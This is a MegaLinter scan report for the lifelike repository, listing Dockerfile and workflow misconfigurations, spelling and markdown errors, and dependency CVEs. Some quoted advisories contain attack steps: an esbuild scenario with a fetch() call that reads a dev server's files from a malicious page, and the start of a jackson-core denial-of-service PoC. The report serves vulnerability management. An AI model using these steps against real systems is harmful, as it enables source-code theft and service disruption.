## ✅⚠️[MegaLinter](https://megalinter.io/9.4.0) analysis: Success with warnings



| Descriptor  |                                   Linter                                    |Files|Fixed|Errors|Warnings|Elapsed time|
|-------------|-----------------------------------------------------------------------------|----:|----:|-----:|-------:|-----------:|
|✅ JSON      |[prettier](https://megalinter.io/9.4.0/descriptors/json_prettier)            |    4|    2|     0|       0|       1.16s|
|⚠️ MARKDOWN  |[markdownlint](https://megalinter.io/9.4.0/descriptors/markdown_markdownlint)|    1|    0|    10|       0|       1.38s|
|✅ PYTHON    |[ruff](https://megalinter.io/9.4.0/descriptors/python_ruff)                  |    1|    0|     0|       0|        0.9s|
|⚠️ REPOSITORY|[checkov](https://megalinter.io/9.4.0/descriptors/repository_checkov)        |  yes|     |    17|      no|      43.27s|
|⚠️ REPOSITORY|[trivy](https://megalinter.io/9.4.0/descriptors/repository_trivy)            |  yes|     |    70|      45|      38.01s|
|⚠️ SPELL     |[cspell](https://megalinter.io/9.4.0/descriptors/spell_cspell)               |   10|     |     7|       0|       3.22s|
|✅ YAML      |[prettier](https://megalinter.io/9.4.0/descriptors/yaml_prettier)            |    3|    1|     0|       0|       1.06s|

## Detailed Issues

<details>
<summary>⚠️ REPOSITORY / checkov - 17 errors</summary>

```
error: Ensure that a user for the container has been created
   ┌─ docker/elasticsearch.Dockerfile:1:1
   │  
 1 │ ╭ ARG ELASTICSEARCH_VERSION=7.16.3
 2 │ │ FROM docker.elastic.co/elasticsearch/elasticsearch:${ELASTICSEARCH_VERSION}
 3 │ │ 
 4 │ │ LABEL org.opencontainers.image.source https://github.com/SBRG/lifelike
   · │
10 │ │ # Set default configuration environment variables
11 │ │ ENV http.max_content_length=200mb
   │ ╰─────────────────────────────────^
   │  
   = Ensure that a user for the container has been created
   = Ensure that a user for the container has been created

error: Ensure that COPY is used instead of ADD in Dockerfiles
   ┌─ graph-db/migrator/Dockerfile:30:1
   │
30 │ ADD --chown=liquibase:liquibase https://github.com/neo4j-contrib/neo4j-jdbc/releases/download/${NEO4J_JDBC_VERSION}/neo4j-jdbc-driver-${NEO4J_JDBC_VERSION}.jar lib/
   │ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   │
   = Ensure that COPY is used instead of ADD in Dockerfiles
   = Ensure that COPY is used instead of ADD in Dockerfiles

error: Ensure that COPY is used instead of ADD in Dockerfiles
   ┌─ graph-db/migrator/Dockerfile:56:1
   │
56 │ ADD --chown=liquibase:liquibase https://raw.githubusercontent.com/vishnubob/wait-for-it/81b1373f17855a4dc21156cfe1694c31d7d1792e/wait-for-it.sh /wait-for-it.sh
   │ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   │
   = Ensure that COPY is used instead of ADD in Dockerfiles
   = Ensure that COPY is used instead of ADD in Dockerfiles

error: Ensure that a user for the container has been created
   ┌─ graph-db/migrator/Dockerfile:1:1
   │  
 1 │ ╭ ARG LIQUIBASE_IMAGE_TAG=4.7.1
 2 │ │ 
 3 │ │ # ========================================
 4 │ │ # Maven build stage
   · │
62 │ │ 
63 │ │ CMD ["update"]
   │ ╰──────────────^
   │  
   = Ensure that a user for the container has been created
   = Ensure that a user for the container has been created

error: Ensure the base image uses a non latest version tag
  ┌─ client/Dockerfile:6:1
  │
6 │ FROM $NODE_IMAGE_TAG as angular-deps
  │ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  │
  = Ensure the base image uses a non latest version tag
  = Ensure the base image uses a non latest version tag

error: Ensure that a user for the container has been created
   ┌─ client/Dockerfile:1:1
   │  
 1 │ ╭ ARG NODE_IMAGE_TAG=node:20
 2 │ │ 
 3 │ │ # ==================================================================
 4 │ │ # Angular app dependencies by default used for local development
   · │
64 │ │ ENV PORT 80
65 │ │ EXPOSE $PORT
   │ ╰────────────^
   │  
   = Ensure that a user for the container has been created
   = Ensure that a user for the container has been created

error: The build output cannot be affected by user parameters other than the build entry point and the top-level source location. GitHub Actions workflow_dispatch inputs MUST be empty. 
   ┌─ .github/workflows/graphdb-migrate.yml:6:1
   │  
 6 │ ╭       neo4j_host:
 7 │ │         description: Neo4j target host
 8 │ │         type: string
 9 │ │         required: true
   · │
58 │ │ jobs:
59 │ │   migrate:
   │ ╰──────────^
   │  
   = The build output cannot be affected by user parameters other than the build entry point and the top-level source location. GitHub Actions workflow_dispatch inputs MUST be empty. 
   = The build output cannot be affected by user parameters other than the build entry point and the top-level source location. GitHub Actions workflow_dispatch inputs MUST be empty. 

error: The build output cannot be affected by user parameters other than the build entry point and the top-level source location. GitHub Actions workflow_dispatch inputs MUST be empty. 
   ┌─ .github/workflows/sonar.yml:11:1
   │  
11 │ ╭       application:
12 │ │         required: false
13 │ │         type: choice
14 │ │         default: ""
   · │
21 │ │ jobs:
22 │ │   sonarqube:
   │ ╰────────────^
   │  
   = The build output cannot be affected by user parameters other than the build entry point and the top-level source location. GitHub Actions workflow_dispatch inputs MUST be empty. 
   = The build output cannot be affected by user parameters other than the build entry point and the top-level source location. GitHub Actions workflow_dispatch inputs MUST be empty. 

error: The build output cannot be affected by user parameters other than the build entry point and the top-level source location. GitHub Actions workflow_dispatch inputs MUST be empty. 
   ┌─ .github/workflows/browserstack.yml:5:1
   │  
 5 │ ╭       baseUrl:
 6 │ │         description: Base URL of environment to test against
 7 │ │         required: true
 8 │ │         type: string
 9 │ │ 
10 │ │ jobs:
11 │ │   browserstack:
   │ ╰───────────────^
   │  
   = The build output cannot be affected by user parameters other than the build entry point and the top-level source location. GitHub Actions workflow_dispatch inputs MUST be empty. 
   = The build output cannot be affected by user parameters other than the build entry point and the top-level source location. GitHub Actions workflow_dispatch inputs MUST be empty. 

error: Ensure top-level permissions are not set to write-all
  ┌─ .github/workflows/graphdb-migrate.yml:1:1
  │
1 │ name: Grpah DB Migrate
  │ ^^^^^^^^^^^^^^^^^^^^^^
  │
  = Ensure top-level permissions are not set to write-all
  = Ensure top-level permissions are not set to write-all

error: Ensure top-level permissions are not set to write-all
   ┌─ .github/workflows/tests.yml:15:1
   │  
15 │ ╭     permissions:
16 │ │       contents: read
   │ ╰────────────────────^
   │  
   = Ensure top-level permissions are not set to write-all
   = Ensure top-level permissions are not set to write-all

error: Ensure top-level permissions are not set to write-all
   ┌─ .github/workflows/codeql-analysis.yml:31:1
   │  
31 │ ╭     permissions:
32 │ │       # required for all workflows
   │ ╰──────────────────────────────────^
   │  
   = Ensure top-level permissions are not set to write-all
   = Ensure top-level permissions are not set to write-all

error: Ensure top-level permissions are not set to write-all
   ┌─ .github/workflows/copilot-auto-fix.yml:15:1
   │  
15 │ ╭     permissions:
16 │ │       pull-requests: write
   │ ╰──────────────────────────^
   │  
   = Ensure top-level permissions are not set to write-all
   = Ensure top-level permissions are not set to write-all

error: Ensure top-level permissions are not set to write-all
   ┌─ .github/workflows/docker.yml:36:1
   │  
36 │ ╭     permissions:
37 │ │       contents: read
   │ ╰────────────────────^
   │  
   = Ensure top-level permissions are not set to write-all
   = Ensure top-level permissions are not set to write-all

error: Ensure top-level permissions are not set to write-all
  ┌─ .github/workflows/browserstack.yml:1:1
  │
1 │ name: 'BrowserStack Test'
  │ ^^^^^^^^^^^^^^^^^^^^^^^^^
  │
  = Ensure top-level permissions are not set to write-all
  = Ensure top-level permissions are not set to write-all

error: Ensure top-level permissions are not set to write-all
  ┌─ .github/workflows/sonar.yml:1:1
  │
1 │ name: Sonarqube code analysis
  │ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  │
  = Ensure top-level permissions are not set to write-all
  = Ensure top-level permissions are not set to write-all

error: Ensure top-level permissions are not set to write-all
   ┌─ .github/workflows/codeql.yml:27:1
   │  
27 │ ╭     permissions:
28 │ │       actions: read
   │ ╰───────────────────^
   │  
   = Ensure top-level permissions are not set to write-all
   = Ensure top-level permissions are not set to write-all

error: 17 errors emitted
```

</details>

<details>
<summary>⚠️ SPELL / cspell - 7 errors</summary>

```
CHANGELOG.md:23:84     - Unknown word (locustfile) -- laceholders) in `tests/locust/locustfile.py`
  Suggestions: [countfile, countFile, hcountfile, Hcountfile, icountfile]
fc8cdcf9-bc5f-4139-9381-d7fac0957493-megalinter_file_names_cspell.txt:9:14      - Unknown word (locustfile) -- tests locust locustfile
  Suggestions: [countfile, countFile, hcountfile, Hcountfile, icountfile]
megalinter-reports/IDE-config/.vscode/extensions.json:5:6       - Unknown word (esbenp)     -- "esbenp.prettier-vscode",
  Suggestions: [eben, essen, essene, Eben, Essen]
megalinter-reports/IDE-config/.vscode/extensions.json:6:6       - Unknown word (Bridgecrew) -- "Bridgecrew.checkov",
  Suggestions: [bridger, Bridger, bridger's, Bridger's, Bridgette]
megalinter-reports/IDE-config/.vscode/extensions.json:7:6       - Unknown word (charliermarsh) -- "charliermarsh.ruff",
  Suggestions: []
megalinter-reports/IDE-config/.vscode/extensions.json:9:16      - Unknown word (debugpy)       -- "ms-python.debugpy",
  Suggestions: [debug, debugs, debussy, Debug, Debussy]
megalinter-reports/IDE-config/.vscode/extensions.json:10:6      - Unknown word (msjsdiag)      -- "msjsdiag.debugger-for-chrome
  Suggestions: [misdial]
CSpell: Files checked: 10, Issues found: 7 in 3 files.


You can skip this misspellings by defining the following .cspell.json file at the root of your repository
Of course, please correct real typos before :)

{
    "version": "0.2",
    "language": "en",
    "ignorePaths": [
        "**/node_modules/**",
        "**/vscode-extension/**",
        "**/.git/**",
        "**/.pnpm-lock.json",
        ".vscode",
        "package-lock.json",
        "megalinter-reports"
    ],
    "words": [
        "Bridgecrew",
        "charliermarsh",
        "debugpy",
        "esbenp",
        "locustfile",
        "msjsdiag"
    ]
}


You can also copy-paste megalinter-reports/.cspell.json at the root of your repository
```

</details>

<details>
<summary>⚠️ MARKDOWN / markdownlint - 10 errors</summary>

```
CHANGELOG.md:42 error MD024/no-duplicate-heading Multiple headings with the same content [Context: "Changed"]
CHANGELOG.md:48 error MD024/no-duplicate-heading Multiple headings with the same content [Context: "Added"]
CHANGELOG.md:55 error MD024/no-duplicate-heading Multiple headings with the same content [Context: "Changed"]
CHANGELOG.md:61 error MD024/no-duplicate-heading Multiple headings with the same content [Context: "Changed"]
CHANGELOG.md:71 error MD024/no-duplicate-heading Multiple headings with the same content [Context: "Fixed"]
CHANGELOG.md:75 error MD024/no-duplicate-heading Multiple headings with the same content [Context: "Changed"]
CHANGELOG.md:81 error MD024/no-duplicate-heading Multiple headings with the same content [Context: "Changed"]
CHANGELOG.md:84 error MD024/no-duplicate-heading Multiple headings with the same content [Context: "Security"]
CHANGELOG.md:89 error MD024/no-duplicate-heading Multiple headings with the same content [Context: "Added"]
CHANGELOG.md:95 error MD024/no-duplicate-heading Multiple headings with the same content [Context: "Fixed"]
```

</details>

<details>
<summary>⚠️ REPOSITORY / trivy - 70 errors</summary>

```
warning: Package: flask-caching
Installed Version: 1.10.1
Vulnerability CVE-2021-33026
Severity: MEDIUM
Fixed Version: 
Link: [CVE-2021-33026](https://avd.aquasec.com/nvd/cve-2021-33026)
   ┌─ appserver/requirements.txt:96:1
   │
96 │ flask-caching==1.10.1
   │ ^
   │
   = The Flask-Caching extension through 1.10.1 for Flask relies on Pickle  ...
   = The Flask-Caching extension through 1.10.1 for Flask relies on Pickle for serialization, which may lead to remote code execution or local privilege escalation. If an attacker gains access to cache storage (e.g., filesystem, Memcached, Redis, etc.), they can construct a crafted payload, poison the cache, and execute Python code. NOTE: a third party indicates that exploitation is extremely unlikely unless the machine is already compromised; in other cases, the attacker would be unable to write their payload to the cache and generate the required collision

warning: Package: flask-httpauth
Installed Version: 4.8.0
Vulnerability CVE-2026-34531
Severity: MEDIUM
Fixed Version: 4.8.1
Link: [CVE-2026-34531](https://avd.aquasec.com/nvd/cve-2026-34531)
    ┌─ appserver/requirements.txt:100:1
    │
100 │ flask-httpauth==4.8.0
    │ ^
    │
    = Flask-HTTPAuth provides Basic, Digest and Token HTTP authentication fo ...
    = Flask-HTTPAuth provides Basic, Digest and Token HTTP authentication for Flask routes. Prior to version 4.8.1, in a situation where the client makes a request to a token protected resource without passing a token, or passing an empty token, Flask-HTTPAuth would invoke the application's token verification callback function with the token argument set to an empty string. If the application had any users in its database with an empty string set as their token, then it could potentially authenticate the client request against any of those users. This issue has been patched in version 4.8.1.

warning: Package: cryptography
Installed Version: 46.0.6
Vulnerability CVE-2026-39892
Severity: MEDIUM
Fixed Version: 46.0.7
Link: [CVE-2026-39892](https://avd.aquasec.com/nvd/cve-2026-39892)
  ┌─ appserver/uv.lock:1:1
  │
1 │ version = 1
  │ ^
  │
  = cryptography: Cryptography: Buffer overflow via non-contiguous buffer in API
  = cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. From 45.0.0 to before 46.0.7, if a non-contiguous buffer was passed to APIs which accepted Python buffers (e.g. Hash.update()), this could lead to buffer overflows. This vulnerability is fixed in 46.0.7.

warning: Package: flask-caching
Installed Version: 1.10.1
Vulnerability CVE-2021-33026
Severity: MEDIUM
Fixed Version: 
Link: [CVE-2021-33026](https://avd.aquasec.com/nvd/cve-2021-33026)
  ┌─ appserver/uv.lock:1:1
  │
1 │ version = 1
  │ ^
  │
  = The Flask-Caching extension through 1.10.1 for Flask relies on Pickle  ...
  = The Flask-Caching extension through 1.10.1 for Flask relies on Pickle for serialization, which may lead to remote code execution or local privilege escalation. If an attacker gains access to cache storage (e.g., filesystem, Memcached, Redis, etc.), they can construct a crafted payload, poison the cache, and execute Python code. NOTE: a third party indicates that exploitation is extremely unlikely unless the machine is already compromised; in other cases, the attacker would be unable to write their payload to the cache and generate the required collision

warning: Package: flask-httpauth
Installed Version: 4.8.0
Vulnerability CVE-2026-34531
Severity: MEDIUM
Fixed Version: 4.8.1
Link: [CVE-2026-34531](https://avd.aquasec.com/nvd/cve-2026-34531)
  ┌─ appserver/uv.lock:1:1
  │
1 │ version = 1
  │ ^
  │
  = Flask-HTTPAuth provides Basic, Digest and Token HTTP authentication fo ...
  = Flask-HTTPAuth provides Basic, Digest and Token HTTP authentication for Flask routes. Prior to version 4.8.1, in a situation where the client makes a request to a token protected resource without passing a token, or passing an empty token, Flask-HTTPAuth would invoke the application's token verification callback function with the token argument set to an empty string. If the application had any users in its database with an empty string set as their token, then it could potentially authenticate the client request against any of those users. This issue has been patched in version 4.8.1.

error: Package: @angular/common
Installed Version: 14.3.0
Vulnerability CVE-2025-66035
Severity: HIGH
Fixed Version: 21.0.1, 20.3.14, 19.2.16
Link: [CVE-2025-66035](https://avd.aquasec.com/nvd/cve-2025-66035)
    ┌─ client/yarn.lock:217:1
    │  
217 │ ╭ "@angular/common@~14.3.0":
218 │ │   version "14.3.0"
219 │ │   resolved "https://registry.yarnpkg.com/@angular/common/-/common-14.3.0.tgz#HIDDEN_BY_MEGALINTER"
220 │ │   integrity sha512-pV9oyG3JhGWeQ+TFB0Qub6a1VZWMNZ6/7zEopvYivdqa5yDLLDSBRWb6P80RuONXyGnM1pa7l5nYopX+r/23GQ==
221 │ │   dependencies:
222 │ │     tslib "^2.3.0"
    │ ╰^
    │  
    = angular: Angular HTTP Client Has XSRF Token Leakage via Protocol-Relative URLs
    = Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to versions 19.2.16, 20.3.14, and 21.0.1, there is a XSRF token leakage via protocol-relative URLs in angular HTTP clients. The vulnerability is a Credential Leak by App Logic that leads to the unauthorized disclosure of the Cross-Site Request Forgery (XSRF) token to an attacker-controlled domain. Angular's HttpClient has a built-in XSRF protection mechanism that works by checking if a request URL starts with a protocol (http:// or https://) to determine if it is cross-origin. If the URL starts with protocol-relative URL (//), it is incorrectly treated as a same-origin request, and the XSRF token is automatically added to the X-XSRF-TOKEN header. This issue has been patched in versions 19.2.16, 20.3.14, and 21.0.1. A workaround for this issue involves avoiding using protocol-relative URLs (URLs starting with //) in HttpClient requests. All backend communication URLs should be hardcoded as relative paths (starting with a single /) or fully qualified, trusted absolute URLs.

error: Package: @angular/compiler
Installed Version: 14.3.0
Vulnerability CVE-2025-66412
Severity: HIGH
Fixed Version: 21.0.2, 20.3.15, 19.2.17
Link: [CVE-2025-66412](https://avd.aquasec.com/nvd/cve-2025-66412)
    ┌─ client/yarn.lock:245:1
    │  
245 │ ╭ "@angular/compiler@~14.3.0":
246 │ │   version "14.3.0"
247 │ │   resolved "https://registry.yarnpkg.com/@angular/compiler/-/compiler-14.3.0.tgz#HIDDEN_BY_MEGALINTER"
248 │ │   integrity sha512-E15Rh0t3vA+bctbKnBCaDmLvc3ix+ZBt6yFZmhZalReQ+KpOlvOJv+L9oiFEgg+rYVl2QdvN7US1fvT0PqswLw==
249 │ │   dependencies:
250 │ │     tslib "^2.3.0"
    │ ╰^
    │  
    = angular: Angular Stored XSS Vulnerability via SVG Animation, SVG URL and MathML Attributes
    = Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to 21.0.2, 20.3.15, and 19.2.17, A Stored Cross-Site Scripting (XSS) vulnerability has been identified in the Angular Template Compiler. It occurs because the compiler's internal security schema is incomplete, allowing attackers to bypass Angular's built-in security sanitization. Specifically, the schema fails to classify certain URL-holding attributes (e.g., those that could contain javascript: URLs) as requiring strict URL security, enabling the injection of malicious scripts. This vulnerability is fixed in 21.0.2, 20.3.15, and 19.2.17.

error: Package: @angular/compiler
Installed Version: 14.3.0
Vulnerability CVE-2026-22610
Severity: HIGH
Fixed Version: 21.1.0-rc.0, 21.0.7, 20.3.16, 19.2.18
Link: [CVE-2026-22610](https://avd.aquasec.com/nvd/cve-2026-22610)
    ┌─ client/yarn.lock:245:1
    │  
245 │ ╭ "@angular/compiler@~14.3.0":
246 │ │   version "14.3.0"
247 │ │   resolved "https://registry.yarnpkg.com/@angular/compiler/-/compiler-14.3.0.tgz#HIDDEN_BY_MEGALINTER"
248 │ │   integrity sha512-E15Rh0t3vA+bctbKnBCaDmLvc3ix+ZBt6yFZmhZalReQ+KpOlvOJv+L9oiFEgg+rYVl2QdvN7US1fvT0PqswLw==
249 │ │   dependencies:
250 │ │     tslib "^2.3.0"
    │ ╰^
    │  
    = angular: Angular: Cross-site scripting vulnerability in Template Compiler
    = Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to versions 19.2.18, 20.3.16, 21.0.7, and 21.1.0-rc.0, a cross-site scripting (XSS) vulnerability has been identified in the Angular Template Compiler. The vulnerability exists because Angular’s internal sanitization schema fails to recognize the href and xlink:href attributes of SVG <script> elements as a Resource URL context. This issue has been patched in versions 19.2.18, 20.3.16, 21.0.7, and 21.1.0-rc.0.

error: Package: @angular/core
Installed Version: 14.3.0
Vulnerability CVE-2026-22610
Severity: HIGH
Fixed Version: 21.1.0-rc.0, 21.0.7, 20.3.16, 19.2.18
Link: [CVE-2026-22610](https://avd.aquasec.com/nvd/cve-2026-22610)
    ┌─ client/yarn.lock:257:1
    │  
257 │ ╭ "@angular/core@~14.3.0":
258 │ │   version "14.3.0"
259 │ │   resolved "https://registry.yarnpkg.com/@angular/core/-/core-14.3.0.tgz#HIDDEN_BY_MEGALINTER"
260 │ │   integrity sha512-wYiwItc0Uyn4FWZ/OAx/Ubp2/WrD3EgUJ476y1XI7yATGPF8n9Ld5iCXT08HOvc4eBcYlDfh90kTXR6/MfhzdQ==
261 │ │   dependencies:
262 │ │     tslib "^2.3.0"
    │ ╰^
    │  
    = angular: Angular: Cross-site scripting vulnerability in Template Compiler
    = Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Prior to versions 19.2.18, 20.3.16, 21.0.7, and 21.1.0-rc.0, a cross-site scripting (XSS) vulnerability has been identified in the Angular Template Compiler. The vulnerability exists because Angular’s internal sanitization schema fails to recognize the href and xlink:href attributes of SVG <script> elements as a Resource URL context. This issue has been patched in versions 19.2.18, 20.3.16, 21.0.7, and 21.1.0-rc.0.

error: Package: @angular/core
Installed Version: 14.3.0
Vulnerability CVE-2026-27970
Severity: HIGH
Fixed Version: 21.2.0, 21.1.6, 20.3.17, 19.2.19
Link: [CVE-2026-27970](https://avd.aquasec.com/nvd/cve-2026-27970)
    ┌─ client/yarn.lock:257:1
    │  
257 │ ╭ "@angular/core@~14.3.0":
258 │ │   version "14.3.0"
259 │ │   resolved "https://registry.yarnpkg.com/@angular/core/-/core-14.3.0.tgz#HIDDEN_BY_MEGALINTER"
260 │ │   integrity sha512-wYiwItc0Uyn4FWZ/OAx/Ubp2/WrD3EgUJ476y1XI7yATGPF8n9Ld5iCXT08HOvc4eBcYlDfh90kTXR6/MfhzdQ==
261 │ │   dependencies:
262 │ │     tslib "^2.3.0"
    │ ╰^
    │  
    = @angular/core: Angular: Cross-site scripting via compromised translation files
    = Angular is a development platform for building mobile and desktop web applications using TypeScript/JavaScript and other languages. Versions prior to 21.2.0, 21.1.16, 20.3.17, and 19.2.19 have a cross-Site scripting vulnerability in the Angular internationalization (i18n) pipeline. In ICU messages (International Components for Unicode), HTML from translated content was not properly sanitized and could execute arbitrary JavaScript. Angular i18n typically involves three steps, extracting all messages from an application in the source language, sending the messages to be translated, and then merging their translations back into the final source code. Translations are frequently handled by contracts with specific partner companies, and involve sending the source messages to a separate contractor before receiving final translations for display to the end user. If the returned translations have malicious content, it could be rendered into the application and execute arbitrary JavaScript. When successfully exploited, this vulnerability allows for execution of attacker controlled JavaScript in the application origin. Depending on the nature of the application being exploited this could lead to credential exfiltration and/or page vandalism. Several preconditions apply to the attack. The attacker must compromise the translation file (xliff, xtb, etc.). Unlike most XSS vulnerabilities, this issue is not exploitable by arbitrary users. An attacker must first compromise an application's translation file before they can escalate privileges into the Angular application client. The victim application must use Angular i18n, use one or more ICU messages, render an ICU message, and not defend against XSS via a safe content security policy. Versions 21.2.0, 21.1.6, 20.3.17, and 19.2.19 patch the issue. Until the patch is applied, developers should consider reviewing and verifying translated content received from untrusted third parties before incorporating it in an Angular application, enabling strict CSP controls to block unauthorized JavaScript from executing on the page, and enabling Trusted Types to enforce proper HTML sanitization.

error: Package: crypto-js
Installed Version: 4.1.1
Vulnerability CVE-2023-46233
Severity: CRITICAL
Fixed Version: 4.2.0
Link: [CVE-2023-46233](https://avd.aquasec.com/nvd/cve-2023-46233)
     ┌─ client/yarn.lock:4362:1
     │  
4362 │ ╭ crypto-js@^4.1.1:
4363 │ │   version "4.1.1"
4364 │ │   resolved "https://registry.yarnpkg.com/crypto-js/-/crypto-js-4.1.1.tgz#HIDDEN_BY_MEGALINTER"
4365 │ │   integrity sha512-o2JlM7ydqd3Qk9CA0L4NL6mTzU2sdx96a+oOfPu8Mkl/PK51vSyoi8/rQ8NknZtk44vq15lmhAj9CIAGwgeWKw==
     │ ╰^
     │  
     = crypto-js: PBKDF2 1,000 times weaker than specified in 1993 and 1.3M times weaker than current standard
     = crypto-js is a JavaScript library of crypto standards. Prior to version 4.2.0, crypto-js PBKDF2 is 1,000 times weaker than originally specified in 1993, and at least 1,300,000 times weaker than current industry standard. This is because it both defaults to SHA1, a cryptographic hash algorithm considered insecure since at least 2005, and defaults to one single iteration, a 'strength' or 'difficulty' value specified at 1,000 when specified in 1993. PBKDF2 relies on iteration count as a countermeasure to preimage and collision attacks. If used to protect passwords, the impact is high. If used to generate signatures, the impact is high. Version 4.2.0 contains a patch for this issue. As a workaround, configure crypto-js to use SHA256 with at least 250,000 iterations.

warning: Package: esbuild
Installed Version: 0.15.5
Vulnerability GHSA-67mh-4wv8-2f99
Severity: MEDIUM
Fixed Version: 0.25.0
Link: [GHSA-67mh-4wv8-2f99](https://github.com/advisories/GHSA-67mh-4wv8-2f99)
     ┌─ client/yarn.lock:5432:1
     │  
5432 │ ╭ esbuild@0.15.5:
5433 │ │   version "0.15.5"
5434 │ │   resolved "https://registry.yarnpkg.com/esbuild/-/esbuild-0.15.5.tgz#HIDDEN_BY_MEGALINTER"
5435 │ │   integrity sha512-VSf6S1QVqvxfIsSKb3UKr3VhUCis7wgDbtF4Vd9z84UJr05/Sp2fRKmzC+CSPG/dNAPPJZ0BTBLTT1Fhd6N9Gg==
     · │
5456 │ │     esbuild-windows-64 "0.15.5"
5457 │ │     esbuild-windows-arm64 "0.15.5"
     │ ╰^
     │  
     = esbuild enables any website to send any requests to the development server and read the response
     = ### Summary
       
       esbuild allows any websites to send any request to the development server and read the response due to default CORS settings.
       
       ### Details
       
       esbuild sets `Access-Control-Allow-Origin: *` header to all requests, including the SSE connection, which allows any websites to send any request to the development server and read the response.
       
       https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L121
       https://github.com/evanw/esbuild/blob/df815ac27b84f8b34374c9182a93c94718f8a630/pkg/api/serve_other.go#L363
       
       **Attack scenario**:
       
       1. The attacker serves a malicious web page (`http://malicious.example.com`).
       1. The user accesses the malicious web page.
       1. The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.
       1. The attacker gets the content of `http://127.0.0.1:8000/main.js`.
       
       In this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by
       
       - Fetching `/index.html`: normally you have a script tag here
       - Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files
       - Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`)
       - Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file
       
       The scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file.
       
       ### PoC
       
       1. Download [reproduction.zip](https://github.com/user-attachments/files/18561484/reproduction.zip)
       2. Extract it and move to that directory
       1. Run `npm i`
       1. Run `npm run watch`
       1. Run `fetch('http://127.0.0.1:8000/app.js').then(r => r.text()).then(content => console.log(content))` in a different website's dev tools.
       
       ![image](https://github.com/user-attachments/assets/08fc2e4d-e1ec-44ca-b0ea-78a73c3c40e9)
       
       ### Impact
       
       Users using the serve feature may get the source code stolen by malicious websites.

error: Package: com.fasterxml.jackson.core:jackson-core
Installed Version: 2.13.1
Vulnerability CVE-2025-52999
Severity: HIGH
Fixed Version: 2.15.0
Link: [CVE-2025-52999](https://avd.aquasec.com/nvd/cve-2025-52999)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = com.fasterxml.jackson.core/jackson-core: jackson-core Potential StackoverflowError
  = jackson-core contains core low-level incremental ("streaming") parser and generator abstractions used by Jackson Data Processor. In versions prior to 2.15.0, if a user parses an input file and it has deeply nested data, Jackson could end up throwing a StackoverflowError if the depth is particularly large. jackson-core 2.15.0 contains a configurable limit for how deep Jackson will traverse in an input document, defaulting to an allowable depth of 1000. jackson-core will throw a StreamConstraintsException if the limit is reached. jackson-databind also benefits from this change because it uses jackson-core to parse JSON inputs. As a workaround, users should avoid parsing input files from untrusted sources.

warning: Package: com.fasterxml.jackson.core:jackson-core
Installed Version: 2.13.1
Vulnerability GHSA-72hv-8253-57qq
Severity: MEDIUM
Fixed Version: 2.21.1, 2.18.6
Link: [GHSA-72hv-8253-57qq](https://github.com/advisories/GHSA-72hv-8253-57qq)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = jackson-core: Number Length Constraint Bypass in Async Parser Leads to Potential DoS Condition
  = ### Summary
    The non-blocking (async) JSON parser in `jackson-core` bypasses the `maxNumberLength` constraint (default: 1000 characters) defined in `StreamReadConstraints`. This allows an attacker to send JSON with arbitrarily long numbers through the async parser API, leading to excessive memory allocation and potential CPU exhaustion, resulting in a Denial of Service (DoS).
    
    The standard synchronous parser correctly enforces this limit, but the async parser fails to do so, creating an inconsistent enforcement policy.
    
    ### Details
    The root cause is that the async parsing path in `NonBlockingUtf8JsonParserBase` (and related classes) does not call the methods responsible for number length validation.
    
    - The number parsing methods (e.g., `_finishNumberIntegralPart`) accumulate digits into the `TextBuffer` without any length checks.
    - After parsing, they call `_valueComplete()`, which finalizes the token but does **not** call `resetInt()` or `resetFloat()`.
    - The `resetInt()`/`resetFloat()` methods in `ParserBase` are where the `validateIntegerLength()` and `validateFPLength()` checks are performed.
    - Because this validation step is skipped, the `maxNumberLength` constraint is never enforced in the async code path.
    
    ### PoC
    The following JUnit 5 test demonstrates the vulnerability. It shows that the async parser accepts a 5,000-digit number, whereas the limit should be 1,000.
    
    ```java
    package tools.jackson.core.unittest.dos;
    
    import java.nio.charset.StandardCharsets;
    
    import org.junit.jupiter.api.Test;
    
    import tools.jackson.core.*;
    import tools.jackson.core.exc.StreamConstraintsException;
    import tools.jackson.core.json.JsonFactory;
    import tools.jackson.core.json.async.NonBlockingByteArrayJsonParser;
    
    import static org.junit.jupiter.api.Assertions.*;
    
    /**
     * POC: Number Length Constraint Bypass in Non-Blocking (Async) JSON Parsers
     *
     * Authors: sprabhav7, rohan-repos
     * 
     * maxNumberLength default = 1000 characters (digits).
     * A number with more than 1000 digits should be rejected by any parser.
     *
     * BUG: The async parser never calls resetInt()/resetFloat() which is where
     * validateIntegerLength()/validateFPLength() lives. Instead it calls
     * _valueComplete() which skips all number length validation.
     *
